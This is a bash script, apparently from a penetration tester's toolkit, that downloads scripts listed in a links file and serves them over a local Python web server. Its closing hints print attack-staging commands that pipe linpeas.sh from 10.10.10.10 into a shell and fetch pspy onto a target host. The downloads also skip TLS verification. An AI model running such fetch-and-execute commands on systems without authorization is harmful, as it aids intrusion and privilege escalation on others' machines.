#!/usr/bin/env bash

# Download usefull files and start a http server on port 8000

# Shared functions
source "$HOME/.local/bin/functions"

# Index page
PAGESTART="""<html>
<title>Get your scipts</title>
<body>
<h3>FILES:</h3>"""
PAGEEND="""</br>&copy; by Brazier85</body></html>"""

function getScript {
	URL=$1
	NAME=$2
	ok "Downloading latest version of $NAME"
	mkdir -p $HOME/scripts
	curl -sS -k $URL -o $HOME/scripts/$NAME
	chmod +x $HOME/scripts/$NAME
	chmod 755 $HOME/scripts/$NAME
}

function addLink {
	NAME=$1
	LINK=$2
	echo "<a href=\"${NAME}\" target=\"_blank\">${NAME}</a> - Docs: <a href=\"${LINK}\" target=\"_blank\">${NAME}</a></br>" >> $HOME/scripts/index.html
}

# Del old index
if [ -f $HOME/scripts/index.html ]; then
	rm -f $HOME/scripts/index.html
fi

echo ${PAGESTART} >> $HOME/scripts/index.html

# Download Scripts
if [ -f $HOME/scripts/links.txt ]; then
	info "Downloading files from ${RED}links.txt${RST}"
	file="$HOME/scripts/links.txt"
	while IFS=, read -r URL NAME LINK
	do
		getScript "$URL" "$NAME"
		addLink "$NAME" "$LINK"
	done <"$file"
else
	error "Could not find ${RED}links.txt${RST} skipping file download"
fi

cd $HOME/scripts
ok "Starting Python webserver"
info "Scripts to download:"
echo ""
for file in $(find $HOME/scripts/ -type f); do
	ok $(basename -- "$file")
done
echo ""
info "Take a look at http://localhost:8000 for docs"
info "Get it via curl 10.10.10.10:8000/linpeas.sh | sh"
info "Get it via wget http://10.10.10.10:8000/pspy32s"
echo ""
echo "${PAGEEND}" >> $HOME/scripts/index.html
python3 -m http.server
